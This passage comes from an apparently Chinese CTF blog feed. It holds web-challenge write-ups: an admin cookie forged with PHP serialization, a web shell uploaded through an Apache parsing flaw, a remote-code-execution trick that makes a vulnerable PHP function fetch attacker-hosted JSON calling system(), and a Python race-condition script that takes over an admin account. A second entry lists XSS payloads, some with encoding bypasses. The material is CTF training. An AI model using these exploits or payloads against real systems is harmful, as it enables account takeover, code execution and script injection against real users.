class="number">%227</span>cbab5cea99169139e7e6d8ff74ebb77<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>D</span><br></pre></td></tr></table></figure></p>
<p>url解码再反序列化一下可以看到上面的其实就是：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191024203014196.png" alt="在这里插入图片描述"><br>于是我们利用如下脚本伪造cookie：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = <span class="number">1</span>;</span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line">$sign = [<span class="string">"id"</span>=&gt;<span class="number">1</span>,<span class="string">"name"</span>=&gt;<span class="string">"admin"</span>,<span class="string">"sign"</span>=&gt;md5($id.$username)];</span><br><span class="line">print_r($sign);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191024203104249.png" alt="在这里插入图片描述">将cookie更改为上述生成的，刷新页面，发现已经是管理员账户登录，然后我们来到上传界面：<br><img src="/2019/10/25/Web安全测试个人赛练习/2019102420323151.png" alt="在这里插入图片描述"><br>测试发现为黑名单过滤，且Apache版本为2.2.15，可能存在解析漏洞，于是上传<code>shell.php.aaa</code>：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191024204019198.png" alt="在这里插入图片描述"><br>发现可以成功，连接shell得到flag。<br><img src="/2019/10/25/Web安全测试个人赛练习/20191024204041382.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><p>题目在<code>dama.xxxx</code>给了<code>dama.php</code>的源码，且看到<code>flag.php</code>在它们的上一层目录。</p>
<p>审计代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $j = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>第一步要绕过的是<code>chkpass()</code>函数，这个比较简单，直接使<code>User-Agent</code>为<code>$a</code>（也就是传进去的pass参数值）的md5即可绕过。</p>
<p>接下来下面重点看的是这个函数：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>$b</code>为<code>$a</code>经过<code>gencodeurl()</code>处理后的值，然后以 <code>$b</code> 为文件名，将其中的内容赋给<code>$c</code>，再对该内容进行json解码赋值给<code>$d</code>。</p>
<p>由<code>$d[&#39;f&#39;]($d[&#39;d&#39;]);</code>可以看出来最终<code>$d</code>解码得到的应该是一个关联数组，且有键<code>f</code>和<code>d</code>，然后它们的值构成一个可变函数，<code>$d[&#39;f&#39;]</code>为函数名，<code>$d[&#39;d&#39;]</code>为参数。</p>
<p>这里就是我们可以利用的地方，想办法构造<code>system(&#39;cat ../flag&#39;)</code>，这样我们就可以读到上面的flag了，所以我们将<code>[&quot;f&quot;=&gt;&quot;system&quot;,&quot;d&quot;=&gt;&quot;&#39;cat ../flag.php&#39;&quot;]</code> </p>
<p>JSON编码一下得到：<code>{&quot;f&quot;:&quot;system&quot;,&quot;d&quot;:&quot;cat ../flag.php&quot;}</code>，这就是<code>file_get_contents</code>应该读到的文件内容，下面就是如何让读到这个文件。</p>
<p>看一下<code>gencodeurl</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难看出，当<code>$a</code>的长度大于40时，返回值是<code>http://</code>拼接<code>$a</code>的31~35位再拼接 <code>$a</code>的11~20位，也就是说我们可控的只有15位。</p>
<p>我们将上面构造内容命名为文件<code>1</code>，放到自己服务器上（假设ip位123.123.1.123），可以看到<code>123.123.1.123/1</code>刚好15位，这样我们构造下面这个<code>$a</code>时：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaa11<span class="number">.8</span><span class="number">.105</span>/<span class="number">1</span>aaaaaaaaaa129<span class="number">.2</span>aaaaaa</span><br></pre></td></tr></table></figure>
<p>返回值就会为：<code>http://123.123.1.123/1</code>，通过<code>file_get_contents</code>就可以从我们的服务器上获取内容了。</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191025011222610.png" alt="在这里插入图片描述"></p>
<h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><p>题目存在git泄露，得到源码，进行代码审计。</p>
<p>首先看一下<code>index.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	header(<span class="string">'location: ./login.php'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$flag = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;is_admin($_SESSION[<span class="string">'username'</span>]) &amp;&amp; file_exists(FLAGFILE))&#123;</span><br><span class="line">	$flag = <span class="string">"WELL DONE! "</span>.file_get_contents(FLAGFILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到要想获得flag，需要通过<code>is_admin()</code>的验证，跟踪这个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$user = zUserFile::get_attrs($username);</span><br><span class="line">	<span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取$username的所有信息</span></span><br><span class="line"><span class="comment">//从前面可以看到$users['attrs'][$username] = array("email" =&gt; $email, "is_admin" =&gt; 0, "email_verify" =&gt; 0, "token" =&gt; "");</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$users = zUserFile::get_all_users();</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要想验证通过，需要<code>$user</code>里的<code>is_admin</code>值为1，发现这边并没有什么可以利用的点，继续审计，重点放在如何可以登录admin的账号，发现该系统存在切换关联账号的功能：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//switch.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	header(<span class="string">'location: ./login.php'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">	$to_user = zUserFile::get_attrs($username);</span><br><span class="line">	<span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">		$userObj-&gt;login2($username);</span><br><span class="line">		header(<span class="string">'Location: ./'</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$username = trim($username);</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>login2</code>没有其他任何的验证，也就是说如果邮箱相同且均认证了，那么不同账号就可以相互切换登录。</p>
<p>再想到一开始的注册页面给了<code>admin</code>的邮箱为<a href="mailto:`ambulong@vulnspy.com" target="_blank" rel="noopener">`ambulong@vulnspy.com</a><code>，那么思路应该就是注册一个账号，并关联到</code>admin<code>的邮箱上，这样就可以切换到</code>admin`帐号了。</p>
<p>直接绑定管理员的邮箱肯定是不行的，该系统还存在修改绑定邮箱的功能，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//chgemail.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	header(<span class="string">'location: ./'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;is_admin($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'FORBIDDEN'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跟一下chg_email()函数</span></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$user = zUserFile::get_attrs($username);</span><br><span class="line">	$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">	$emails = zUserFile::get_emails();</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">		$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line">		<span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line">			<span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">	zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">	zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">	$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">	$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line">	<span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到当你重新绑定邮箱的时候，<code>email_verify</code>就会变为0，而我们得不到管理员邮箱的认证，就无法绑定成功。所以要想成功绑定，还得取看一下认证功能的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//verify.php</span></span><br><span class="line">f(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">	$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">		$userObj-&gt;login($username);</span><br><span class="line">		header(<span class="string">'location: ./'</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跟一下verify_email()</span></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$token = trim($token);</span><br><span class="line">	<span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$user = zUserFile::get_attrs($username);<span class="comment">//取出所有信息</span></span><br><span class="line">	$real_token = $user[<span class="string">"token"</span>];			<span class="comment">//取出用户的token</span></span><br><span class="line">	<span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;	<span class="comment">//验证token是否正确</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//----存在条件竞争的地方----</span></span><br><span class="line">	zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);			<span class="comment">//清空token</span></span><br><span class="line">	zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);	<span class="comment">//认证成功</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常的认证流程应该是：</p>
<ul>
<li>① 填写绑定邮箱 </li>
<li>② 收到带有token的认证邮件 </li>
<li>③ 带着用户名和token去访问认证页面 </li>
<li>④ token验证正确 </li>
<li>⑤  <code>email_verify</code>置为1，前面填写的邮箱绑定成功</li>
</ul>
<p>而我们可以利用条件竞争，在上述正常流程的第4和第5步之间请求绑定<code>admin</code>的邮箱，由于没有验证<code>$email</code>的状态，所以要绑定的<code>$email</code>被重置为了<code>admin</code>的邮箱，这时再执行第5步，则可以认证成功。</p>
<p>于是我们先注册一个账号，并且绑定自己的邮箱来得到token，然后再访问认证链接的同时快速的，请求绑定<code>admin</code>的邮箱，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://114.55.36.69:8023/"</span></span><br><span class="line">verify_url= <span class="string">"/verify.php?token=oust3dEPSxpoZ9wKUVjo8ZFleaGdZaff&amp;username=lethe3"</span></span><br><span class="line">SESSION=<span class="string">"9gr7bgt3ht65r3hbe3sgcm7032"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_email</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(url + verify_url)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    reset_url = url + <span class="string">"/chgemail.php?token=QNgbstcy"</span></span><br><span class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(reset_url, cookies=cookies, data=data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=verify_email, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>运行后刷新页面，发现已经成功绑定管理员邮箱：<br><img src="/2019/10/25/Web安全测试个人赛练习/2019102516365379.png" alt="在这里插入图片描述"></p>
<p>切换<code>admin</code>账号即可：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191025163716493.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS刷题之旅</title>
    <url>/2019/07/30/XSS%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<h3 id="0x01-一些资源或文章："><a href="#0x01-一些资源或文章：" class="headerlink" title="0x01 一些资源或文章："></a>0x01 一些资源或文章：</h3><p><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">XSS总结</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a><br><a href="https://www.zybuluo.com/laodao/note/9592" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet 中文版</a><br><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload" target="_blank" rel="noopener">XSS攻击手段&amp;在CTF中的运用</a></p>
<p><br></p>
<h3 id="0x02-常用Payload（慢慢积累…）"><a href="#0x02-常用Payload（慢慢积累…）" class="headerlink" title="0x02 常用Payload（慢慢积累…）"></a>0x02 常用Payload（慢慢积累…）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"x"</span> <span class="attribute">onerror</span>=alert(1)&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"1"</span> <span class="attribute">onerror</span>=eval("alert('xss')")&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onmouseover</span>=alert('xss')&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">"javascript:aaa"</span> onmouseover=<span class="string">"alert(/xss/)"</span>&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">需要用编码绕过时：</span></span><br><span class="line"><span class="regexp">Base64：&lt;a href=data:text/html</span>;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;M</span><br><span class="line"></span><br><span class="line">urlencode：&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：&lt;a href=j&amp;<span class="comment">#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M</span></span><br><span class="line">&lt;a href=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>)&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="" onclick=eval(alert('xss'))&gt;bb&lt;/a</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>)&gt;cc&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;iframe src="data:text/html,<span class="variable">&amp;lt</span>;script<span class="variable">&amp;gt</span>;alert('xss')<span class="variable">&amp;lt</span>;/script<span class="variable">&amp;gt</span>;"&gt;</span><span class="params">&lt;/iframe&gt;</span></span><br><span class="line"><span class="params">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="&gt;</span></span><br><span class="line"><span class="params">&lt;iframe src="aaa" onmouseover=alert('xss') /&gt;</span><span class="params">&lt;iframe&gt;</span></span><br><span class="line"><span class="params">&lt;iframe src="javascript<span class="variable">&amp;colon</span>;prompt<span class="variable">&amp;lpar</span>;`xss`<span class="variable">&amp;rpar</span>;"&gt;</span><span class="params">&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">onclick</span>=alert('xss') <span class="attribute">type</span>=<span class="string">"text"</span>&gt;</span><br><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"name"</span> <span class="attribute">onmouseover</span>=alert('xss')&gt;</span><br><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"name"</span> <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">onmouseover</span>=prompt('xss') <span class="attribute">bad</span>=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input <span class="attribute">value</span>=1 <span class="attribute">type</span>=image src <span class="attribute">onerror</span>=alert(1) &gt;</span><br></pre></td></tr></table></figure>
